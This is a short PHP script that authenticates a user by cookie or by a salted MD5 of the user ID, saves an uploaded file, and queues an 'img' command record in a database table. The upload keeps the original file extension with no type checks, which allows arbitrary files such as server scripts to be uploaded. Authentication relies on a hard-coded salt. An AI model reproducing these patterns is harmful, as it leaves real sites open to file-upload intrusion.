<?php
require_once "libs.php";

if(isset($_COOKIE['userId'])){$userArr=cookieValid()[1]; $frm = 'send';}
elseif(isset($_POST['usrId'])){
$raw_data = $pdo->query("select * from userData");
while ($data = $raw_data->fetch(PDO::FETCH_ASSOC))
{
if(strtolower(md5($data['userId']."SALTlake")) == $_POST['usrId']){$userArr=$data;$frm='recv';}
}
}

$filename = $_FILES['file']['name'];
$ext = pathinfo($filename,PATHINFO_EXTENSION);
$filename= md5(rand(100000000000000,999999999999999).$filename).'.'.$ext;
$location = "uploaded_files/".$filename;
$uploadOk = 1;

if($uploadOk != 0)
{
   if(move_uploaded_file($_FILES['file']['tmp_name'], $location)){
      echo $filename;

$tim = time();
$qry = "insert into commands (usrId, cmnd, time, exec, `from`) values (:id, :cmd, '".time()."', 0, '".$frm."')";
$raw_data = $pdo->prepare($qry);
$raw_data->execute(array(
':cmd' => "img ".$filename,
':id' => $userArr['userId']
));
}
}
?>
